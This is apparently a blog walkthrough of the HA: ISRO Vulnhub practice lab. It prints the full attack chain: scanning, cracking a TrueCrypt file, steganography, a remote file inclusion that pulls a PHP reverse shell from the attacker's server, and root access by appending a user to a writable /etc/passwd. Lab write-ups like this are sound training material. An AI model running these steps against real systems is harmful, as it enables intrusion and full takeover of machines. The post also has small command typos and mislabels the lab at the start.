---
title: 'HA: ISRO Vulnhub Walkthrough'
date: 2019-10-19T18:36:00+01:00
draft: false
---

Today we are going to solve our CTF challenge called “HA: Infinity Stones” We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

Download **[Here](https://www.vulnhub.com/entry/ha-isro,376/)**

Level: Intermediate

Task: Find 4 Flags on the victim’s machine.

### **Penetration Methodologies**

*   **Scanning Network**
    *   Netdiscover
    *   Nmap
*   **Enumeration**
    *   Browsing HTTP Service
    *   Performing Directory Bruteforce
*   **Exploitation**
    *   LFI
    *   Create PHP reverse shell
    *   Reading /etc/passwd file
    *   Getting a reverse connection
    *   Spawning a TTY Shell
*   **Privilege Escalation**
    *   Writable etc/passwd File

### **Walkthrough**

### **Scanning Network**

Firsts of all we try to identify our target and for this use the following command:

```
netdiscover
```

![](https://i0.wp.com/1.bp.blogspot.com/-LmnUilije5Y/XatDNtM0eOI/AAAAAAAAhCo/VMuwiwUPCMw7X0QLHUsQP7K6d3WtDedagCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Now that we have identified our target using the above command, we can continue on to our second step that is scanning the target. We will use nmap to scan the target with the following command:

```
nmap -A 192.168.1.104
```

![](https://i0.wp.com/1.bp.blogspot.com/-Dvgnb0etrQY/XatDQ_5eB-I/AAAAAAAAhDM/t8b_DwVUxlU4GZngOVN1C4AIKwOsJgReQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

With the help of help scan, we now know that port number 22, 80 are open with the service of SSH, HTTP respectively. Now that port 80 is open we open the target IP address in our browser as shown in the following image:

```
http://192.168.1.104
```

![](https://i1.wp.com/1.bp.blogspot.com/-dLbN5MDXj0k/XatDTypBhNI/AAAAAAAAhDo/IF5GFCW6H7IAxZx21bpEIACV2OtcIwxzgCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

It opened a webpage as shown in the above image. Here we found the Bhaskara page, so now we opened and found an information webpage there as shown in the image below:

```
http://192.168.1.104/bhaskara.html
```

![](https://i2.wp.com/1.bp.blogspot.com/-CiMx9taAfZI/XatDTVTIvmI/AAAAAAAAhDk/JlFqXP_JSMsvoe92kancqNFlS9vBD3UfACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

As a convention, we will enumerate the webpage by going through the source code. We see that we have the Bhaskara Launch Code. This seems a base64 encoded text.

![](https://i2.wp.com/1.bp.blogspot.com/-JR5VJmJVBHU/XatDUEKQu8I/AAAAAAAAhDs/tEYiZVUoIHsYCPt0RspLwHIk6LDGEyS-gCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Now we got to decode it. To do this we will be using the combination of the echo command and the base64 -d.

```
echo "L2JoYXNrYXJh" 1 base64 -d
```

After decoding the base64 encoded text we get “/bhaskara”. This seems a hint that there might be a directory named bhaskara.

![](https://i1.wp.com/1.bp.blogspot.com/-F-aDgzcbwD4/XatDUIhAF7I/AAAAAAAAhDw/XNWYU0dPgJIe9EKCMlixO3dqiJV8AlTZQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

So, we went on to our browser in order to browse the bhaskara directory. We see that a file is downloaded when we browse the URL. This is a 2MB file. After enumerating the file, we came to realize that it is a TrueCrypt file.

![](https://i2.wp.com/1.bp.blogspot.com/-0oqPJwNvFdw/XatDUXEHciI/AAAAAAAAhD0/ZPU6R5orHakOpWOroMk1-Oenj436g0q3gCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Now in order to crack this file, we are going to use extract its hash using the true.py. You can download the true.py from this **[link](https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/truecrypt2john.py)**. We named the file as true.py and ran it and it gave us the password as xavier.

```
python true.py bhaskara > hashes  
john hashes --show
```

![](https://i2.wp.com/1.bp.blogspot.com/-hfRg4opO92E/XatDUxq-7kI/AAAAAAAAhD4/dmqCOlpiscoCOGMFqpDsLc8NZwUBSf9tQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

Now as we knew it was a TrueCrypt file. That means it might be hiding something inside it. So, we tried to open it using VeraCrypt by providing it path and selecting a volume as shown in the given image.

![](https://i2.wp.com/1.bp.blogspot.com/-TSWzb3qm2Is/XatDVKqD0CI/AAAAAAAAhD8/nDohPcS5_l8Tv3oj0owfloZAAligpl56gCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

Upon mounting the TrueCrypt file on a slot, we are asked to enter the password. We enter the password that we found earlier i.e. ‘xavier’

![](https://i0.wp.com/1.bp.blogspot.com/-Bzbdv_Yx28E/XatDNiQvMaI/AAAAAAAAhCs/EB8cXjo2SX44HgysujbxC18orD2VlLicQCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

 It opened up to show a text file labelled ‘flag.txt’. We opened it; it gave us our first flag. Bhaskara Flag.

**Bhaskara Flag: {b7bb88578a70970b9be45ac8630b6f9d}**

![](https://i1.wp.com/1.bp.blogspot.com/-ourP80vNP20/XatDNh46YnI/AAAAAAAAhCk/lDfoTYLVssMffrNwr4LrFoK3WJ4IMxGPACLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

Now let’s move forward in Enumeration. We also performed a directory scan. This gave us an /img directory. We performed an extension directory scan. It gave us a connect.php.

```
dirb http://192.168.1.104  
dirb http://192.168.1.104 -X .php
```

We went into the /img directory. Here we found an image called aryabhata.jpg.

![](https://i2.wp.com/1.bp.blogspot.com/-JBTdZkfn1mU/XatDOk201GI/AAAAAAAAhC0/Cs4N4t1gmVAnxMlTXrPwOYjqDqTXdHA7QCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

We will download the aryabhata.jpg and opened it.  

![](https://i0.wp.com/1.bp.blogspot.com/-h2-zzhdVS7M/XatDOrjR1iI/AAAAAAAAhCw/QHYpTO0UdpAJDnMsR_YEy4k1ZBhtjwv7ACLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

Upon opening it we found it to be the poster for Aryabhata satellite as shown in the image given below.

![](https://i0.wp.com/1.bp.blogspot.com/-1ShZF1LXg_c/XatDP1Np10I/AAAAAAAAhDA/fdaVKgwZ3pAdlQxQiz8_INnhwiYlBfGZACLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

As we couldn’t find anything specific with the image, we suspected that there is some steganography involved. Hence, we decided to use the Steghide tool to extract anything that might be hidden in the image. We saw that there is a text file named flag.txt hidden inside it. On opening it we found the Aryabhata flag. 

```
steghide extract -sf aryabhata.jpg  
cat flag.txt
```

**Aryabhata Flag:{e39cf1cbb00f09141259768b6d4c63fb}**

![](https://i2.wp.com/1.bp.blogspot.com/-aw1K3LQKHng/XatDPiN_LCI/AAAAAAAAhC4/LpOaqKIiX8cjzD6FJ_d5h886tfDeNMr3QCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

### **Exploitation**

Back to the Web Browser, we also found a connect.php in our drib directory bruteforce. This gave us nothing. Then we realized that this can be command injection. Now to test we tried opening the etc/passwd file through it. As seen in the image given below, we see that it’s a File Inclusion Vulnerability.

```
192.168.1.104/connect.php?file=/etc/passwd
```

![](https://i1.wp.com/1.bp.blogspot.com/-rn8kNrrCMYs/XatDPyFIbfI/AAAAAAAAhC8/MWIEeet_WS0NFM8Sq8Yo5PjEscPrCCQogCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

We edited our shell.php, to enter the attacker machine IP address. And then closed the file after saving it. Now we need to send this to the target machine. Hence, we started a python http server using the one-liner showed below.

```
nano shell.php  
python -m SimpleHTTPServer
```

![](https://i1.wp.com/1.bp.blogspot.com/-ivO_XM0XXuU/XatDQq34CTI/AAAAAAAAhDE/WCff6o9QMNIWwEmxH1odXHrqRPwM9LNwACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

We are gonna capture a reverse connection using the netcat. So we need to initiate a listener on the port mentioned in the shell file.

```
nc -lvp 1234
```

After starting the listener on the target machine, we will run the shell on the target machine using the File Inclusion Vulnerability.

```
192.168.1.104/connect.php?file=http://192.168.1.103:8000/shell.php
```

![](https://i1.wp.com/1.bp.blogspot.com/-4cto9TGIvZE/XatDQm52N6I/AAAAAAAAhDI/zUOsGalsAQ8xRcWLaIOI5YM1W3DOp-IVwCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

Upon execution, the shell gave us a session to the target machine. As seen in the image given below, it wasn’t a proper shell. So, we needed a python one liner to convert it into a proper shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We used netstat command to check for the IP address and ports the target machine is listening on and found that a web service (3306) is allowed for localhost only. The most common service to run on the port 3306 is MySQL. Let’s enumerate in that direction.

```
netstat -antp
```

![](https://i1.wp.com/1.bp.blogspot.com/-mPrcYjn9GL4/XatDR0fPdMI/AAAAAAAAhDQ/osGjIiqt7sscYH3j4C9Z8fDFYBhxiBCTwCLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

We tried to login in the MySQL database as the root user. After logging in the MySQL, we enumerated the databases. Here we found a database named ‘flag’. We looked inside the tables of flag database. Here we found our second flag Mangalyaan Flag.

```
mysql -u root   
show databases;  
use flag;  
show tables;  
select \* from flag;
```

**Mangalyaan Flag:{d8a7f803e36f1c84e277009bf2c0f435}**

![](https://i1.wp.com/1.bp.blogspot.com/-2SuRmdqTjqM/XatDR7Q-YII/AAAAAAAAhDY/IWXeD8mBgoEE1FGiA1duV6N5dDV2hvwuwCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

### **Privilege Escalation**

As a part of our Enumeration for Escalating Privilege on the target machine, we try to find if the /etc/passwd is writable. We can see that the file is, in fact, writable. This is our way to move forward.

```
ls -la /etc/passwd
```

![](https://i1.wp.com/1.bp.blogspot.com/-IzLYFzF1JrI/XatDSPFnnHI/AAAAAAAAhDU/fNfIGGMwcQEo4mtsuuHVqbnBJF9VNsnhwCLcBGAsYHQ/s1600/22.png?w=687&ssl=1)

Now we going to need the password hash for the user that we are going to create on the target machine by making an entry in the /etc/passwd file. We are going to use the openssl to generate a salted hash.

```
openssl passwd -1 -salt user3 pass123
```

![](https://i1.wp.com/1.bp.blogspot.com/-zJhJG7J5IM4/XatDSc-5aXI/AAAAAAAAhDc/GXy70z7fuvEknaShNH-MTJM8Eux2LxQAgCLcBGAsYHQ/s1600/23.png?w=687&ssl=1)

Now back to our remote shell on the target machine. Here we are going to use the hash that we generated in the previous step and make a user raj which has the elevated privilege. We used the echo command to make an entry in the /etc/passwd file. After making an entry we checked the entry using the tail command. Now, all we got to do is run su command with the user name we just created and enter the password and we have the root shell. We traversed inside the root directory to find our final flag, Chandrayaan Flag.

```
echo 'raj:$1$user3$rAGRVf5p2jYTqtq0W5cPu/:0:0::/root:/bin/bash' >>/etc/passwd  
tail /etc/passwd  
su raj  
Password: pass123  
cd /root  
ls  
cat final.txt
```

**Chandrayaan Flag:{0ad8d59efe7ce5c820aa7350a5d708b2}**

![](https://i1.wp.com/1.bp.blogspot.com/-AcDhf80elEE/XatDS0JhALI/AAAAAAAAhDg/VgH45BZI_EYnudhiu15_5Vda16MBmKBlACLcBGAsYHQ/s1600/24.png?w=687&ssl=1)

**Author: Pavandeep Singh** is a Technical Writer, Researcher and Penetration Tester Contact [**here**](https://www.linkedin.com/in/pavandeep-singh-6b1074132)

The post [HA: ISRO Vulnhub Walkthrough](https://www.hackingarticles.in/ha-isro-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2MZ87LX